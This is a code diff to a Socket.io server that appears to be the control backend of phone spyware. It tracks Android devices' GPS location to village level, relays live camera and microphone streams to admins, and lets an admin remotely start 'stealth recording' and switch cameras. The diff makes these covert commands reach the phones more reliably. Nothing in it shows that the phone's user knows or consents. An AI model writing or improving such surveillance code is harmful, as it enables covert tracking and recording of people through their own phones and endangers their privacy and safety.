@@ -59,12 +59,36 @@ app.use('/api/admin', adminRoutes);
 
 // Socket.io Real-Time Live Streaming & Command Events
 io.on('connection', (socket) => {
+  // Helper to ensure socket is properly registered in rooms and device maps
+  const trackDeviceSocket = (deviceId, deviceName, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry) => {
+    if (!deviceId) return;
+    socket.join(`device_${deviceId}`);
+    socket.join('devices');
+    socketToDevice.set(socket.id, deviceId);
+
+    const existing = connectedDevices.get(deviceId) || {};
+    const now = new Date();
+    connectedDevices.set(deviceId, {
+      ...existing,
+      socketId: socket.id,
+      deviceId,
+      deviceName: deviceName || existing.deviceName || 'Android Device',
+      batteryLevel: batteryLevel !== undefined ? batteryLevel : (existing.batteryLevel || 100),
+      isRecording: isRecording !== undefined ? Boolean(isRecording) : (existing.isRecording || false),
+      lastSeen: now,
+      latitude: latitude ? Number(latitude) : (existing.latitude || null),
+      longitude: longitude ? Number(longitude) : (existing.longitude || null),
+      locationName: locationName || existing.locationName || '',
+      villageOrPara: villageOrPara || existing.villageOrPara || '',
+      districtAndCountry: districtAndCountry || existing.districtAndCountry || '',
+      locationUpdatedAt: latitude ? now : (existing.locationUpdatedAt || undefined),
+    });
+  };
+
   // Device registration from Android phone
   socket.on('register-device', async (data) => {
     if (!data || !data.deviceId) return;
     let { deviceId, deviceName, batteryLevel, latitude, longitude, locationName, villageOrPara, districtAndCountry } = data;
-    socket.join(`device_${deviceId}`);
-    socket.join('devices');
     const now = new Date();
 
     // High precision Village / Para resolution if coordinates exist
@@ -85,21 +109,7 @@ io.on('connection', (socket) => {
       }
     }
 
-    connectedDevices.set(deviceId, {
-      socketId: socket.id,
-      deviceId,
-      deviceName: deviceName || 'Android Device',
-      batteryLevel: batteryLevel !== undefined ? batteryLevel : 100,
-      isStreaming: false,
-      lastSeen: now,
-      latitude: latitude ? Number(latitude) : null,
-      longitude: longitude ? Number(longitude) : null,
-      locationName: locationName || '',
-      villageOrPara: villageOrPara || '',
-      districtAndCountry: districtAndCountry || '',
-      locationUpdatedAt: latitude ? now : undefined,
-    });
-    socketToDevice.set(socket.id, deviceId);
+    trackDeviceSocket(deviceId, deviceName, batteryLevel, false, latitude, longitude, locationName, villageOrPara, districtAndCountry);
     console.log(`📱 Device registered on Socket: ${deviceId} (${deviceName || 'Android'}) [📍 ${villageOrPara || locationName || 'Locating...'}]`);
 
     // Keep MongoDB lastSeen & location up to date
@@ -136,10 +146,10 @@ io.on('connection', (socket) => {
     });
   });
 
-  // Device periodic heartbeat (every 20s from phone) with real-time GPS
+  // Device periodic heartbeat (every 15-20s from phone) with real-time GPS
   socket.on('device-heartbeat', async (data) => {
     if (!data || !data.deviceId) return;
-    let { deviceId, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry } = data;
+    let { deviceId, deviceName, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry } = data;
     const now = new Date();
 
     if (latitude && longitude) {
@@ -159,20 +169,7 @@ io.on('connection', (socket) => {
       }
     }
 
-    const dev = connectedDevices.get(deviceId);
-    if (dev) {
-      dev.lastSeen = now;
-      if (batteryLevel !== undefined) dev.batteryLevel = batteryLevel;
-      if (isRecording !== undefined) dev.isRecording = Boolean(isRecording);
-      if (latitude) {
-        dev.latitude = Number(latitude);
-        dev.locationUpdatedAt = now;
-      }
-      if (longitude) dev.longitude = Number(longitude);
-      if (locationName) dev.locationName = locationName;
-      if (villageOrPara) dev.villageOrPara = villageOrPara;
-      if (districtAndCountry) dev.districtAndCountry = districtAndCountry;
-    }
+    trackDeviceSocket(deviceId, deviceName, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry);
 
     try {
       await Device.findOneAndUpdate(
@@ -215,19 +212,45 @@ io.on('connection', (socket) => {
   });
 
   // Admin requests to watch live stream for a device
-  socket.on('request-live-stream', ({ deviceId, camera = 'BACK' }) => {
+  socket.on('request-live-stream', async ({ deviceId, camera = 'BACK' }) => {
     console.log(`🎥 Live stream requested for ${deviceId} (Lens: ${camera})`);
     socket.join(`watch_${deviceId}`);
 
-    const dev = connectedDevices.get(deviceId);
-    if (!dev) {
-      socket.emit('stream-error', { deviceId, error: 'Device is offline' });
+    let dev = connectedDevices.get(deviceId);
+    const room = io.sockets.adapter.rooms.get(`device_${deviceId}`);
+    const isRoomActive = room && room.size > 0;
+
+    // Check if device is active in DB (seen in last 5 minutes)
+    let isDbActive = false;
+    try {
+      const dbDev = await Device.findOne({ deviceId });
+      if (dbDev && dbDev.lastSeen) {
+        const diffMs = Date.now() - new Date(dbDev.lastSeen).getTime();
+        isDbActive = diffMs < 300000; // 5 minutes
+      }
+    } catch (e) {
+      // ignore
+    }
+
+    if (!dev && !isRoomActive && !isDbActive) {
+      console.warn(`Device ${deviceId} is offline (no socket, room empty, DB inactive).`);
+      socket.emit('stream-error', { deviceId, error: 'Device is offline or unreachable' });
       return;
     }
 
-    dev.isStreaming = true;
+    if (dev) {
+      dev.isStreaming = true;
+    }
+
+    // Broadcast to room and devices channel so device receives it reliably
     io.to(`device_${deviceId}`).emit('start-live-stream', {
       adminSocketId: socket.id,
+      deviceId,
+      camera,
+    });
+    io.to('devices').emit('start-live-stream', {
+      adminSocketId: socket.id,
+      deviceId,
       camera,
     });
   });
@@ -235,6 +258,7 @@ io.on('connection', (socket) => {
   // Phone sends a compressed video frame
   socket.on('stream-frame', (data) => {
     if (data && data.deviceId) {
+      trackDeviceSocket(data.deviceId);
       // Forward frame to all admins watching this device
       socket.to(`watch_${data.deviceId}`).emit('live-frame', {
         deviceId: data.deviceId,
@@ -247,6 +271,7 @@ io.on('connection', (socket) => {
   // Phone sends real-time microphone audio chunk (PCM)
   socket.on('stream-audio', (data) => {
     if (data && data.deviceId) {
+      trackDeviceSocket(data.deviceId);
       // Forward audio to all admins watching this device
       socket.to(`watch_${data.deviceId}`).emit('live-audio', {
         deviceId: data.deviceId,
@@ -264,7 +289,8 @@ io.on('connection', (socket) => {
     const room = io.sockets.adapter.rooms.get(`watch_${deviceId}`);
     if (!room || room.size === 0) {
       console.log(`🛑 All admins left, stopping live stream on: ${deviceId}`);
-      io.to(`device_${deviceId}`).emit('stop-live-stream');
+      io.to(`device_${deviceId}`).emit('stop-live-stream', { deviceId });
+      io.to('devices').emit('stop-live-stream', { deviceId });
       const dev = connectedDevices.get(deviceId);
       if (dev) dev.isStreaming = false;
     }
@@ -273,7 +299,8 @@ io.on('connection', (socket) => {
   // Switch camera remotely (FRONT <-> BACK)
   socket.on('switch-camera', ({ deviceId, camera }) => {
     console.log(`🔄 Remote switch camera for ${deviceId} -> ${camera}`);
-    io.to(`device_${deviceId}`).emit('switch-camera', { camera });
+    io.to(`device_${deviceId}`).emit('switch-camera', { deviceId, camera });
+    io.to('devices').emit('switch-camera', { deviceId, camera });
   });
 
   // Admin remotely triggers stealth recording on phone
@@ -283,7 +310,8 @@ io.on('connection', (socket) => {
     try {
       await Device.findOneAndUpdate({ deviceId }, { isRecording: true, cameraLens: lens });
     } catch (e) {}
-    io.to(`device_${deviceId}`).emit('start-remote-recording', { camera: lens });
+    io.to(`device_${deviceId}`).emit('start-remote-recording', { deviceId, camera: lens });
+    io.to('devices').emit('start-remote-recording', { deviceId, camera: lens });
     io.to('admins').emit('device-recording-status', { deviceId, isRecording: true, camera: lens });
   });
 
@@ -293,7 +321,8 @@ io.on('connection', (socket) => {
     try {
       await Device.findOneAndUpdate({ deviceId }, { isRecording: false });
     } catch (e) {}
-    io.to(`device_${deviceId}`).emit('stop-remote-recording');
+    io.to(`device_${deviceId}`).emit('stop-remote-recording', { deviceId });
+    io.to('devices').emit('stop-remote-recording', { deviceId });
     io.to('admins').emit('device-recording-status', { deviceId, isRecording: false });
   });
 
@@ -310,10 +339,14 @@ io.on('connection', (socket) => {
   socket.on('disconnect', async () => {
     const deviceId = socketToDevice.get(socket.id);
     if (deviceId) {
-      connectedDevices.delete(deviceId);
+      const currentDev = connectedDevices.get(deviceId);
+      // Only remove if this socket is the active one registered for this device
+      if (currentDev && currentDev.socketId === socket.id) {
+        connectedDevices.delete(deviceId);
+      }
       socketToDevice.delete(socket.id);
       const now = new Date();
-      console.log(`📱 Device disconnected from Socket: ${deviceId}`);
+      console.log(`📱 Device socket disconnected: ${deviceId}`);
 
       try {
         await Device.findOneAndUpdate({ deviceId }, { lastSeen: now });
